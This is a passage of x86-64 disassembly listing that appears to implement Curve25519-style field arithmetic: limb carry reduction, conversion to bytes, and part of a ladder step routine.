   1400030b0:	8b c1                	mov    %ecx,%eax
   1400030b2:	c1 e0 1a             	shl    $0x1a,%eax
   1400030b5:	8b cd                	mov    %ebp,%ecx
   1400030b7:	2b f0                	sub    %eax,%esi
   1400030b9:	c1 f9 1f             	sar    $0x1f,%ecx
   1400030bc:	8b c5                	mov    %ebp,%eax
   1400030be:	c1 f8 19             	sar    $0x19,%eax
   1400030c1:	23 c8                	and    %eax,%ecx
   1400030c3:	44 03 e9             	add    %ecx,%r13d
   1400030c6:	8b c1                	mov    %ecx,%eax
   1400030c8:	c1 e0 19             	shl    $0x19,%eax
   1400030cb:	41 8b cd             	mov    %r13d,%ecx
   1400030ce:	2b e8                	sub    %eax,%ebp
   1400030d0:	c1 f9 1f             	sar    $0x1f,%ecx
   1400030d3:	41 8b c5             	mov    %r13d,%eax
   1400030d6:	c1 f8 1a             	sar    $0x1a,%eax
   1400030d9:	23 c8                	and    %eax,%ecx
   1400030db:	44 03 c9             	add    %ecx,%r9d
   1400030de:	8b c1                	mov    %ecx,%eax
   1400030e0:	c1 e0 1a             	shl    $0x1a,%eax
   1400030e3:	41 8b c9             	mov    %r9d,%ecx
   1400030e6:	44 2b e8             	sub    %eax,%r13d
   1400030e9:	c1 f9 1f             	sar    $0x1f,%ecx
   1400030ec:	41 8b c1             	mov    %r9d,%eax
   1400030ef:	c1 f8 19             	sar    $0x19,%eax
   1400030f2:	23 c8                	and    %eax,%ecx
   1400030f4:	44 03 f1             	add    %ecx,%r14d
   1400030f7:	8b c1                	mov    %ecx,%eax
   1400030f9:	c1 e0 19             	shl    $0x19,%eax
   1400030fc:	41 8b ce             	mov    %r14d,%ecx
   1400030ff:	44 2b c8             	sub    %eax,%r9d
   140003102:	c1 f9 1f             	sar    $0x1f,%ecx
   140003105:	41 8b c6             	mov    %r14d,%eax
   140003108:	c1 f8 1a             	sar    $0x1a,%eax
   14000310b:	23 c8                	and    %eax,%ecx
   14000310d:	44 03 f9             	add    %ecx,%r15d
   140003110:	8b c1                	mov    %ecx,%eax
   140003112:	c1 e0 1a             	shl    $0x1a,%eax
   140003115:	41 8b cf             	mov    %r15d,%ecx
   140003118:	44 2b f0             	sub    %eax,%r14d
   14000311b:	c1 f9 1f             	sar    $0x1f,%ecx
   14000311e:	41 8b c7             	mov    %r15d,%eax
   140003121:	c1 f8 19             	sar    $0x19,%eax
   140003124:	23 c8                	and    %eax,%ecx
   140003126:	44 03 e1             	add    %ecx,%r12d
   140003129:	8b c1                	mov    %ecx,%eax
   14000312b:	c1 e0 19             	shl    $0x19,%eax
   14000312e:	41 8b cc             	mov    %r12d,%ecx
   140003131:	44 2b f8             	sub    %eax,%r15d
   140003134:	c1 f9 1f             	sar    $0x1f,%ecx
   140003137:	41 8b c4             	mov    %r12d,%eax
   14000313a:	c1 f8 1a             	sar    $0x1a,%eax
   14000313d:	23 c8                	and    %eax,%ecx
   14000313f:	8b c1                	mov    %ecx,%eax
   140003141:	c1 e0 1a             	shl    $0x1a,%eax
   140003144:	44 2b e0             	sub    %eax,%r12d
   140003147:	8d 04 39             	lea    (%rcx,%rdi,1),%eax
   14000314a:	8b c8                	mov    %eax,%ecx
   14000314c:	89 44 24 24          	mov    %eax,0x24(%rsp)
   140003150:	c1 f9 1f             	sar    $0x1f,%ecx
   140003153:	8b f8                	mov    %eax,%edi
   140003155:	c1 f8 19             	sar    $0x19,%eax
   140003158:	23 c8                	and    %eax,%ecx
   14000315a:	8b c1                	mov    %ecx,%eax
   14000315c:	c1 e0 19             	shl    $0x19,%eax
   14000315f:	2b f8                	sub    %eax,%edi
   140003161:	41 8b c2             	mov    %r10d,%eax
   140003164:	c1 e0 1a             	shl    $0x1a,%eax
   140003167:	44 6b d1 13          	imul   $0x13,%ecx,%r10d
   14000316b:	44 2b d0             	sub    %eax,%r10d
   14000316e:	45 03 d3             	add    %r11d,%r10d
   140003171:	41 8b c2             	mov    %r10d,%eax
   140003174:	45 8b da             	mov    %r10d,%r11d
   140003177:	49 83 e8 01          	sub    $0x1,%r8
   14000317b:	0f 85 ff fe ff ff    	jne    0x140003080
   140003181:	4c 8b 9c 24 80 00 00 	mov    0x80(%rsp),%r11
   140003188:	00 
   140003189:	41 8b ca             	mov    %r10d,%ecx
   14000318c:	c1 f9 1f             	sar    $0x1f,%ecx
   14000318f:	c1 f8 1a             	sar    $0x1a,%eax
   140003192:	23 c8                	and    %eax,%ecx
   140003194:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   140003198:	f7 d9                	neg    %ecx
   14000319a:	44 89 14 24          	mov    %r10d,(%rsp)
   14000319e:	44 8b c1             	mov    %ecx,%r8d
   1400031a1:	41 c1 e0 1a          	shl    $0x1a,%r8d
   1400031a5:	45 03 c2             	add    %r10d,%r8d
   1400031a8:	2b d9                	sub    %ecx,%ebx
   1400031aa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400031b0:	41 8b d0             	mov    %r8d,%edx
   1400031b3:	41 c1 f8 1a          	sar    $0x1a,%r8d
   1400031b7:	81 e2 ff ff ff 03    	and    $0x3ffffff,%edx
   1400031bd:	41 8d 04 18          	lea    (%r8,%rbx,1),%eax
   1400031c1:	8b d8                	mov    %eax,%ebx
   1400031c3:	c1 f8 19             	sar    $0x19,%eax
   1400031c6:	81 e3 ff ff ff 01    	and    $0x1ffffff,%ebx
   1400031cc:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx
   1400031cf:	8b f1                	mov    %ecx,%esi
   1400031d1:	c1 f9 1a             	sar    $0x1a,%ecx
   1400031d4:	03 cd                	add    %ebp,%ecx
   1400031d6:	81 e6 ff ff ff 03    	and    $0x3ffffff,%esi
   1400031dc:	8b e9                	mov    %ecx,%ebp
   1400031de:	c1 f9 19             	sar    $0x19,%ecx
   1400031e1:	41 03 cd             	add    %r13d,%ecx
   1400031e4:	81 e5 ff ff ff 01    	and    $0x1ffffff,%ebp
   1400031ea:	44 8b e9             	mov    %ecx,%r13d
   1400031ed:	c1 f9 1a             	sar    $0x1a,%ecx
   1400031f0:	41 03 c9             	add    %r9d,%ecx
   1400031f3:	41 81 e5 ff ff ff 03 	and    $0x3ffffff,%r13d
   1400031fa:	44 8b c9             	mov    %ecx,%r9d
   1400031fd:	c1 f9 19             	sar    $0x19,%ecx
   140003200:	41 03 ce             	add    %r14d,%ecx
   140003203:	41 81 e1 ff ff ff 01 	and    $0x1ffffff,%r9d
   14000320a:	44 8b f1             	mov    %ecx,%r14d
   14000320d:	44 89 4c 24 14       	mov    %r9d,0x14(%rsp)
   140003212:	c1 f9 1a             	sar    $0x1a,%ecx
   140003215:	41 81 e6 ff ff ff 03 	and    $0x3ffffff,%r14d
   14000321c:	41 03 cf             	add    %r15d,%ecx
   14000321f:	44 8b f9             	mov    %ecx,%r15d
   140003222:	c1 f9 19             	sar    $0x19,%ecx
   140003225:	41 03 cc             	add    %r12d,%ecx
   140003228:	41 81 e7 ff ff ff 01 	and    $0x1ffffff,%r15d
   14000322f:	44 8b e1             	mov    %ecx,%r12d
   140003232:	c1 f9 1a             	sar    $0x1a,%ecx
   140003235:	41 81 e4 ff ff ff 03 	and    $0x3ffffff,%r12d
   14000323c:	8d 04 39             	lea    (%rcx,%rdi,1),%eax
   14000323f:	8b f8                	mov    %eax,%edi
   140003241:	c1 f8 19             	sar    $0x19,%eax
   140003244:	44 6b c0 13          	imul   $0x13,%eax,%r8d
   140003248:	81 e7 ff ff ff 01    	and    $0x1ffffff,%edi
   14000324e:	89 7c 24 24          	mov    %edi,0x24(%rsp)
   140003252:	44 03 c2             	add    %edx,%r8d
   140003255:	44 89 04 24          	mov    %r8d,(%rsp)
   140003259:	49 83 eb 01          	sub    $0x1,%r11
   14000325d:	0f 85 4d ff ff ff    	jne    0x1400031b0
   140003263:	41 8d 90 13 00 00 fc 	lea    -0x3ffffed(%r8),%edx
   14000326a:	44 89 8c 24 80 00 00 	mov    %r9d,0x80(%rsp)
   140003271:	00 
   140003272:	c1 fa 1f             	sar    $0x1f,%edx
   140003275:	4c 8d 4c 24 0c       	lea    0xc(%rsp),%r9
   14000327a:	f7 d2                	not    %edx
   14000327c:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   140003280:	89 74 24 08          	mov    %esi,0x8(%rsp)
   140003284:	41 ba 01 00 00 00    	mov    $0x1,%r10d
   14000328a:	89 6c 24 0c          	mov    %ebp,0xc(%rsp)
   14000328e:	44 89 74 24 18       	mov    %r14d,0x18(%rsp)
   140003293:	44 89 7c 24 1c       	mov    %r15d,0x1c(%rsp)
   140003298:	44 89 64 24 20       	mov    %r12d,0x20(%rsp)
   14000329d:	44 89 6c 24 10       	mov    %r13d,0x10(%rsp)
   1400032a2:	41 8b 49 f8          	mov    -0x8(%r9),%ecx
   1400032a6:	45 8b da             	mov    %r10d,%r11d
   1400032a9:	41 83 e3 01          	and    $0x1,%r11d
   1400032ad:	74 08                	je     0x1400032b7
   1400032af:	81 f1 ff ff ff 01    	xor    $0x1ffffff,%ecx
   1400032b5:	eb 06                	jmp    0x1400032bd
   1400032b7:	81 f1 ff ff ff 03    	xor    $0x3ffffff,%ecx
   1400032bd:	f7 d1                	not    %ecx
   1400032bf:	8b c1                	mov    %ecx,%eax
   1400032c1:	c1 e0 10             	shl    $0x10,%eax
   1400032c4:	23 c8                	and    %eax,%ecx
   1400032c6:	8b c1                	mov    %ecx,%eax
   1400032c8:	c1 e0 08             	shl    $0x8,%eax
   1400032cb:	23 c8                	and    %eax,%ecx
   1400032cd:	8b c1                	mov    %ecx,%eax
   1400032cf:	c1 e0 04             	shl    $0x4,%eax
   1400032d2:	23 c8                	and    %eax,%ecx
   1400032d4:	8d 04 8d 00 00 00 00 	lea    0x0(,%rcx,4),%eax
   1400032db:	23 c8                	and    %eax,%ecx
   1400032dd:	8d 04 09             	lea    (%rcx,%rcx,1),%eax
   1400032e0:	c1 f9 1f             	sar    $0x1f,%ecx
   1400032e3:	c1 f8 1f             	sar    $0x1f,%eax
   1400032e6:	23 c1                	and    %ecx,%eax
   1400032e8:	41 8b 49 fc          	mov    -0x4(%r9),%ecx
   1400032ec:	23 d0                	and    %eax,%edx
   1400032ee:	41 8d 42 ff          	lea    -0x1(%r10),%eax
   1400032f2:	a8 01                	test   $0x1,%al
   1400032f4:	74 08                	je     0x1400032fe
   1400032f6:	81 f1 ff ff ff 01    	xor    $0x1ffffff,%ecx
   1400032fc:	eb 06                	jmp    0x140003304
   1400032fe:	81 f1 ff ff ff 03    	xor    $0x3ffffff,%ecx
   140003304:	f7 d1                	not    %ecx
   140003306:	8b c1                	mov    %ecx,%eax
   140003308:	c1 e0 10             	shl    $0x10,%eax
   14000330b:	23 c8                	and    %eax,%ecx
   14000330d:	8b c1                	mov    %ecx,%eax
   14000330f:	c1 e0 08             	shl    $0x8,%eax
   140003312:	23 c8                	and    %eax,%ecx
   140003314:	8b c1                	mov    %ecx,%eax
   140003316:	c1 e0 04             	shl    $0x4,%eax
   140003319:	23 c8                	and    %eax,%ecx
   14000331b:	8d 04 8d 00 00 00 00 	lea    0x0(,%rcx,4),%eax
   140003322:	23 c8                	and    %eax,%ecx
   140003324:	8d 04 09             	lea    (%rcx,%rcx,1),%eax
   140003327:	c1 f9 1f             	sar    $0x1f,%ecx
   14000332a:	c1 f8 1f             	sar    $0x1f,%eax
   14000332d:	23 c1                	and    %ecx,%eax
   14000332f:	23 d0                	and    %eax,%edx
   140003331:	41 8b 01             	mov    (%r9),%eax
   140003334:	45 85 db             	test   %r11d,%r11d
   140003337:	74 07                	je     0x140003340
   140003339:	35 ff ff ff 01       	xor    $0x1ffffff,%eax
   14000333e:	eb 05                	jmp    0x140003345
   140003340:	35 ff ff ff 03       	xor    $0x3ffffff,%eax
   140003345:	f7 d0                	not    %eax
   140003347:	41 83 c2 03          	add    $0x3,%r10d
   14000334b:	8b c8                	mov    %eax,%ecx
   14000334d:	49 83 c1 0c          	add    $0xc,%r9
   140003351:	c1 e1 10             	shl    $0x10,%ecx
   140003354:	23 c1                	and    %ecx,%eax
   140003356:	8b c8                	mov    %eax,%ecx
   140003358:	c1 e1 08             	shl    $0x8,%ecx
   14000335b:	23 c1                	and    %ecx,%eax
   14000335d:	8b c8                	mov    %eax,%ecx
   14000335f:	c1 e1 04             	shl    $0x4,%ecx
   140003362:	23 c1                	and    %ecx,%eax
   140003364:	8d 0c 85 00 00 00 00 	lea    0x0(,%rax,4),%ecx
   14000336b:	23 c1                	and    %ecx,%eax
   14000336d:	8d 0c 00             	lea    (%rax,%rax,1),%ecx
   140003370:	c1 f8 1f             	sar    $0x1f,%eax
   140003373:	c1 f9 1f             	sar    $0x1f,%ecx
   140003376:	23 c8                	and    %eax,%ecx
   140003378:	23 d1                	and    %ecx,%edx
   14000337a:	41 83 fa 0a          	cmp    $0xa,%r10d
   14000337e:	0f 8c 1e ff ff ff    	jl     0x1400032a2
   140003384:	8b 8c 24 80 00 00 00 	mov    0x80(%rsp),%ecx
   14000338b:	8b c2                	mov    %edx,%eax
   14000338d:	25 ed ff ff 03       	and    $0x3ffffed,%eax
   140003392:	44 2b c0             	sub    %eax,%r8d
   140003395:	8b c2                	mov    %edx,%eax
   140003397:	25 ff ff ff 01       	and    $0x1ffffff,%eax
   14000339c:	81 e2 ff ff ff 03    	and    $0x3ffffff,%edx
   1400033a2:	2b d8                	sub    %eax,%ebx
   1400033a4:	2b e8                	sub    %eax,%ebp
   1400033a6:	2b c8                	sub    %eax,%ecx
   1400033a8:	c1 e3 02             	shl    $0x2,%ebx
   1400033ab:	44 2b f8             	sub    %eax,%r15d
   1400033ae:	c1 e5 05             	shl    $0x5,%ebp
   1400033b1:	2b f8                	sub    %eax,%edi
   1400033b3:	41 c1 e7 03          	shl    $0x3,%r15d
   1400033b7:	2b f2                	sub    %edx,%esi
   1400033b9:	c1 e7 06             	shl    $0x6,%edi
   1400033bc:	c1 e6 03             	shl    $0x3,%esi
   1400033bf:	44 2b ea             	sub    %edx,%r13d
   1400033c2:	41 c1 e5 06          	shl    $0x6,%r13d
   1400033c6:	44 2b f2             	sub    %edx,%r14d
   1400033c9:	44 2b e2             	sub    %edx,%r12d
   1400033cc:	41 8b c0             	mov    %r8d,%eax
   1400033cf:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   1400033d4:	45 03 f6             	add    %r14d,%r14d
   1400033d7:	c1 f8 08             	sar    $0x8,%eax
   1400033da:	41 c1 e4 04          	shl    $0x4,%r12d
   1400033de:	88 42 01             	mov    %al,0x1(%rdx)
   1400033e1:	41 8b c0             	mov    %r8d,%eax
   1400033e4:	c1 f8 10             	sar    $0x10,%eax
   1400033e7:	88 42 02             	mov    %al,0x2(%rdx)
   1400033ea:	8b c3                	mov    %ebx,%eax
   1400033ec:	c1 f8 08             	sar    $0x8,%eax
   1400033ef:	88 42 04             	mov    %al,0x4(%rdx)
   1400033f2:	8b c3                	mov    %ebx,%eax
   1400033f4:	c1 f8 10             	sar    $0x10,%eax
   1400033f7:	88 42 05             	mov    %al,0x5(%rdx)
   1400033fa:	8b c6                	mov    %esi,%eax
   1400033fc:	c1 f8 08             	sar    $0x8,%eax
   1400033ff:	88 42 07             	mov    %al,0x7(%rdx)
   140003402:	8b c6                	mov    %esi,%eax
   140003404:	c1 f8 10             	sar    $0x10,%eax
   140003407:	88 42 08             	mov    %al,0x8(%rdx)
   14000340a:	8b c5                	mov    %ebp,%eax
   14000340c:	c1 f8 08             	sar    $0x8,%eax
   14000340f:	88 42 0a             	mov    %al,0xa(%rdx)
   140003412:	8b c5                	mov    %ebp,%eax
   140003414:	c1 f8 10             	sar    $0x10,%eax
   140003417:	88 42 0b             	mov    %al,0xb(%rdx)
   14000341a:	41 8b c5             	mov    %r13d,%eax
   14000341d:	c1 f8 08             	sar    $0x8,%eax
   140003420:	88 42 0d             	mov    %al,0xd(%rdx)
   140003423:	41 8b c5             	mov    %r13d,%eax
   140003426:	c1 f8 10             	sar    $0x10,%eax
   140003429:	88 42 0e             	mov    %al,0xe(%rdx)
   14000342c:	8b c1                	mov    %ecx,%eax
   14000342e:	c1 f8 08             	sar    $0x8,%eax
   140003431:	88 42 11             	mov    %al,0x11(%rdx)
   140003434:	8b c1                	mov    %ecx,%eax
   140003436:	c1 f8 10             	sar    $0x10,%eax
   140003439:	44 88 02             	mov    %r8b,(%rdx)
   14000343c:	41 c1 f8 18          	sar    $0x18,%r8d
   140003440:	44 0a c3             	or     %bl,%r8b
   140003443:	88 4a 10             	mov    %cl,0x10(%rdx)
   140003446:	c1 fb 18             	sar    $0x18,%ebx
   140003449:	40 0a de             	or     %sil,%bl
   14000344c:	c1 f9 18             	sar    $0x18,%ecx
   14000344f:	c1 fe 18             	sar    $0x18,%esi
   140003452:	40 0a f5             	or     %bpl,%sil
   140003455:	88 42 12             	mov    %al,0x12(%rdx)
   140003458:	c1 fd 18             	sar    $0x18,%ebp
   14000345b:	41 8b c6             	mov    %r14d,%eax
   14000345e:	41 0a ed             	or     %r13b,%bpl
   140003461:	44 88 42 03          	mov    %r8b,0x3(%rdx)
   140003465:	41 c1 fd 18          	sar    $0x18,%r13d
   140003469:	41 0a ce             	or     %r14b,%cl
   14000346c:	88 5a 06             	mov    %bl,0x6(%rdx)
   14000346f:	88 4a 13             	mov    %cl,0x13(%rdx)
   140003472:	40 88 72 09          	mov    %sil,0x9(%rdx)
   140003476:	40 88 6a 0c          	mov    %bpl,0xc(%rdx)
   14000347a:	44 88 6a 0f          	mov    %r13b,0xf(%rdx)
   14000347e:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   140003483:	c1 f8 08             	sar    $0x8,%eax
   140003486:	88 42 14             	mov    %al,0x14(%rdx)
   140003489:	41 8b c6             	mov    %r14d,%eax
   14000348c:	c1 f8 10             	sar    $0x10,%eax
   14000348f:	88 42 15             	mov    %al,0x15(%rdx)
   140003492:	41 8b c7             	mov    %r15d,%eax
   140003495:	c1 f8 08             	sar    $0x8,%eax
   140003498:	88 42 17             	mov    %al,0x17(%rdx)
   14000349b:	41 8b c7             	mov    %r15d,%eax
   14000349e:	c1 f8 10             	sar    $0x10,%eax
   1400034a1:	88 42 18             	mov    %al,0x18(%rdx)
   1400034a4:	41 8b c4             	mov    %r12d,%eax
   1400034a7:	c1 f8 08             	sar    $0x8,%eax
   1400034aa:	88 42 1a             	mov    %al,0x1a(%rdx)
   1400034ad:	41 8b c4             	mov    %r12d,%eax
   1400034b0:	c1 f8 10             	sar    $0x10,%eax
   1400034b3:	88 42 1b             	mov    %al,0x1b(%rdx)
   1400034b6:	8b c7                	mov    %edi,%eax
   1400034b8:	c1 f8 08             	sar    $0x8,%eax
   1400034bb:	41 c1 fe 18          	sar    $0x18,%r14d
   1400034bf:	45 0a f7             	or     %r15b,%r14b
   1400034c2:	88 42 1d             	mov    %al,0x1d(%rdx)
   1400034c5:	41 c1 ff 18          	sar    $0x18,%r15d
   1400034c9:	8b c7                	mov    %edi,%eax
   1400034cb:	45 0a fc             	or     %r12b,%r15b
   1400034ce:	c1 f8 10             	sar    $0x10,%eax
   1400034d1:	41 c1 fc 18          	sar    $0x18,%r12d
   1400034d5:	44 0a e7             	or     %dil,%r12b
   1400034d8:	44 88 72 16          	mov    %r14b,0x16(%rdx)
   1400034dc:	c1 ff 18             	sar    $0x18,%edi
   1400034df:	40 88 7a 1f          	mov    %dil,0x1f(%rdx)
   1400034e3:	44 88 7a 19          	mov    %r15b,0x19(%rdx)
   1400034e7:	44 88 62 1c          	mov    %r12b,0x1c(%rdx)
   1400034eb:	88 42 1e             	mov    %al,0x1e(%rdx)
   1400034ee:	48 83 c4 30          	add    $0x30,%rsp
   1400034f2:	41 5f                	pop    %r15
   1400034f4:	41 5e                	pop    %r14
   1400034f6:	41 5d                	pop    %r13
   1400034f8:	41 5c                	pop    %r12
   1400034fa:	5f                   	pop    %rdi
   1400034fb:	5e                   	pop    %rsi
   1400034fc:	5d                   	pop    %rbp
   1400034fd:	c3                   	ret
   1400034fe:	cc                   	int3
   1400034ff:	cc                   	int3
   140003500:	40 55                	rex push %rbp
   140003502:	53                   	push   %rbx
   140003503:	56                   	push   %rsi
   140003504:	57                   	push   %rdi
   140003505:	41 54                	push   %r12
   140003507:	41 55                	push   %r13
   140003509:	41 56                	push   %r14
   14000350b:	41 57                	push   %r15
   14000350d:	48 8d ac 24 48 fc ff 	lea    -0x3b8(%rsp),%rbp
   140003514:	ff 
   140003515:	48 81 ec b8 04 00 00 	sub    $0x4b8,%rsp
   14000351c:	48 8b 05 dd 7a 00 00 	mov    0x7add(%rip),%rax        # 0x14000b000
   140003523:	48 33 c4             	xor    %rsp,%rax
   140003526:	48 89 85 a0 03 00 00 	mov    %rax,0x3a0(%rbp)
   14000352d:	48 8b 85 40 04 00 00 	mov    0x440(%rbp),%rax
   140003534:	33 db                	xor    %ebx,%ebx
   140003536:	4c 8b bd 38 04 00 00 	mov    0x438(%rbp),%r15
   14000353d:	4d 8b e0             	mov    %r8,%r12
   140003540:	4c 8b b5 28 04 00 00 	mov    0x428(%rbp),%r14
   140003547:	48 8b fa             	mov    %rdx,%rdi
   14000354a:	4c 8b ad 20 04 00 00 	mov    0x420(%rbp),%r13
   140003551:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140003555:	4c 89 4c 24 30       	mov    %r9,0x30(%rsp)
   14000355a:	4c 8b 8d 30 04 00 00 	mov    0x430(%rbp),%r9
   140003561:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003566:	8b 44 24 20          	mov    0x20(%rsp),%eax
   14000356a:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   14000356f:	90                   	nop
   140003570:	48 63 44 24 20       	movslq 0x20(%rsp),%rax
   140003575:	48 63 4c 24 20       	movslq 0x20(%rsp),%rcx
   14000357a:	42 0f b6 04 28       	movzbl (%rax,%r13,1),%eax
   14000357f:	88 84 0d 80 00 00 00 	mov    %al,0x80(%rbp,%rcx,1)
   140003586:	8b 44 24 20          	mov    0x20(%rsp),%eax
   14000358a:	ff c0                	inc    %eax
   14000358c:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140003590:	8b 44 24 20          	mov    0x20(%rsp),%eax
   140003594:	83 f8 50             	cmp    $0x50,%eax
   140003597:	72 d7                	jb     0x140003570
   140003599:	4d 8b c6             	mov    %r14,%r8
   14000359c:	49 8d 4d 08          	lea    0x8(%r13),%rcx
   1400035a0:	be 05 00 00 00       	mov    $0x5,%esi
   1400035a5:	4d 2b c5             	sub    %r13,%r8
   1400035a8:	8b d6                	mov    %esi,%edx
   1400035aa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400035b0:	49 8b 44 08 f8       	mov    -0x8(%r8,%rcx,1),%rax
   1400035b5:	48 01 41 f8          	add    %rax,-0x8(%rcx)
   1400035b9:	49 8b 04 08          	mov    (%r8,%rcx,1),%rax
   1400035bd:	48 01 01             	add    %rax,(%rcx)
   1400035c0:	48 8d 49 10          	lea    0x10(%rcx),%rcx
   1400035c4:	48 83 ea 01          	sub    $0x1,%rdx
   1400035c8:	75 e6                	jne    0x1400035b0
   1400035ca:	48 8b 85 80 00 00 00 	mov    0x80(%rbp),%rax
   1400035d1:	49 2b 06             	sub    (%r14),%rax
   1400035d4:	49 89 06             	mov    %rax,(%r14)
   1400035d7:	48 8b 85 88 00 00 00 	mov    0x88(%rbp),%rax
   1400035de:	49 2b 46 08          	sub    0x8(%r14),%rax
   1400035e2:	49 89 46 08          	mov    %rax,0x8(%r14)
   1400035e6:	48 8b 85 90 00 00 00 	mov    0x90(%rbp),%rax
   1400035ed:	49 2b 46 10          	sub    0x10(%r14),%rax
   1400035f1:	49 89 46 10          	mov    %rax,0x10(%r14)
   1400035f5:	48 8b 85 98 00 00 00 	mov    0x98(%rbp),%rax
   1400035fc:	49 2b 46 18          	sub    0x18(%r14),%rax
   140003600:	49 89 46 18          	mov    %rax,0x18(%r14)
   140003604:	48 8b 85 a0 00 00 00 	mov    0xa0(%rbp),%rax
   14000360b:	49 2b 46 20          	sub    0x20(%r14),%rax
   14000360f:	49 89 46 20          	mov    %rax,0x20(%r14)
   140003613:	48 8b 85 a8 00 00 00 	mov    0xa8(%rbp),%rax
   14000361a:	49 2b 46 28          	sub    0x28(%r14),%rax
   14000361e:	49 89 46 28          	mov    %rax,0x28(%r14)
   140003622:	48 8b 85 b0 00 00 00 	mov    0xb0(%rbp),%rax
   140003629:	49 2b 46 30          	sub    0x30(%r14),%rax
   14000362d:	49 89 46 30          	mov    %rax,0x30(%r14)
   140003631:	48 8b 85 b8 00 00 00 	mov    0xb8(%rbp),%rax
   140003638:	49 2b 46 38          	sub    0x38(%r14),%rax
   14000363c:	49 89 46 38          	mov    %rax,0x38(%r14)
   140003640:	48 8b 85 c0 00 00 00 	mov    0xc0(%rbp),%rax
   140003647:	49 2b 46 40          	sub    0x40(%r14),%rax
   14000364b:	49 89 46 40          	mov    %rax,0x40(%r14)
   14000364f:	48 8b 85 c8 00 00 00 	mov    0xc8(%rbp),%rax
   140003656:	49 2b 46 48          	sub    0x48(%r14),%rax
   14000365a:	49 89 46 48          	mov    %rax,0x48(%r14)
   14000365e:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140003662:	8b 44 24 20          	mov    0x20(%rsp),%eax
   140003666:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000366d:	00 00 00 
   140003670:	48 63 44 24 20       	movslq 0x20(%rsp),%rax
   140003675:	48 63 4c 24 20       	movslq 0x20(%rsp),%rcx
   14000367a:	42 0f b6 04 08       	movzbl (%rax,%r9,1),%eax
   14000367f:	88 84 0d 80 00 00 00 	mov    %al,0x80(%rbp,%rcx,1)
   140003686:	8b 44 24 20          	mov    0x20(%rsp),%eax
   14000368a:	ff c0                	inc    %eax
   14000368c:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140003690:	8b 44 24 20          	mov    0x20(%rsp),%eax
   140003694:	83 f8 50             	cmp    $0x50,%eax
   140003697:	72 d7                	jb     0x140003670
   140003699:	4d 8b c7             	mov    %r15,%r8
   14000369c:	49 8d 49 08          	lea    0x8(%r9),%rcx
   1400036a0:	4d 2b c1             	sub    %r9,%r8
   1400036a3:	48 8b d6             	mov    %rsi,%rdx
   1400036a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400036ad:	00 00 00 
   1400036b0:	49 8b 44 08 f8       	mov    -0x8(%r8,%rcx,1),%rax
   1400036b5:	48 01 41 f8          	add    %rax,-0x8(%rcx)
   1400036b9:	49 8b 04 08          	mov    (%r8,%rcx,1),%rax
   1400036bd:	48 01 01             	add    %rax,(%rcx)
   1400036c0:	48 8d 49 10          	lea    0x10(%rcx),%rcx
   1400036c4:	48 83 ea 01          	sub    $0x1,%rdx
   1400036c8:	75 e6                	jne    0x1400036b0
   1400036ca:	48 8b 85 80 00 00 00 	mov    0x80(%rbp),%rax
   1400036d1:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400036d5:	49 2b 07             	sub    (%r15),%rax
   1400036d8:	4d 8b c6             	mov    %r14,%r8
   1400036db:	49 89 07             	mov    %rax,(%r15)
   1400036de:	49 8b d1             	mov    %r9,%rdx
   1400036e1:	48 8b 85 88 00 00 00 	mov    0x88(%rbp),%rax
   1400036e8:	49 2b 47 08          	sub    0x8(%r15),%rax
   1400036ec:	49 89 47 08          	mov    %rax,0x8(%r15)
   1400036f0:	48 8b 85 90 00 00 00 	mov    0x90(%rbp),%rax
   1400036f7:	49 2b 47 10          	sub    0x10(%r15),%rax
   1400036fb:	49 89 47 10          	mov    %rax,0x10(%r15)
   1400036ff:	48 8b 85 98 00 00 00 	mov    0x98(%rbp),%rax
   140003706:	49 2b 47 18          	sub    0x18(%r15),%rax
   14000370a:	49 89 47 18          	mov    %rax,0x18(%r15)
   14000370e:	48 8b 85 a0 00 00 00 	mov    0xa0(%rbp),%rax
   140003715:	49 2b 47 20          	sub    0x20(%r15),%rax
   140003719:	49 89 47 20          	mov    %rax,0x20(%r15)
   14000371d:	48 8b 85 a8 00 00 00 	mov    0xa8(%rbp),%rax
   140003724:	49 2b 47 28          	sub    0x28(%r15),%rax
   140003728:	49 89 47 28          	mov    %rax,0x28(%r15)
   14000372c:	48 8b 85 b0 00 00 00 	mov    0xb0(%rbp),%rax
   140003733:	49 2b 47 30          	sub    0x30(%r15),%rax
   140003737:	49 89 47 30          	mov    %rax,0x30(%r15)
   14000373b:	48 8b 85 b8 00 00 00 	mov    0xb8(%rbp),%rax
   140003742:	49 2b 47 38          	sub    0x38(%r15),%rax
   140003746:	49 89 47 38          	mov    %rax,0x38(%r15)
   14000374a:	48 8b 85 c0 00 00 00 	mov    0xc0(%rbp),%rax
   140003751:	49 2b 47 40          	sub    0x40(%r15),%rax
   140003755:	49 89 47 40          	mov    %rax,0x40(%r15)
   140003759:	48 8b 85 c8 00 00 00 	mov    0xc8(%rbp),%rax
   140003760:	49 2b 47 48          	sub    0x48(%r15),%rax
   140003764:	49 89 47 48          	mov    %rax,0x48(%r15)
   140003768:	e8 e3 e9 ff ff       	call   0x140002150
   14000376d:	4d 8b c7             	mov    %r15,%r8
   140003770:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003775:	49 8b d5             	mov    %r13,%rdx
   140003778:	e8 d3 e9 ff ff       	call   0x140002150
   14000377d:	48 6b 45 70 13       	imul   $0x13,0x70(%rbp),%rax
   140003782:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140003786:	4c 8b ce             	mov    %rsi,%r9
   140003789:	48 01 45 20          	add    %rax,0x20(%rbp)
   14000378d:	48 6b 45 68 13       	imul   $0x13,0x68(%rbp),%rax
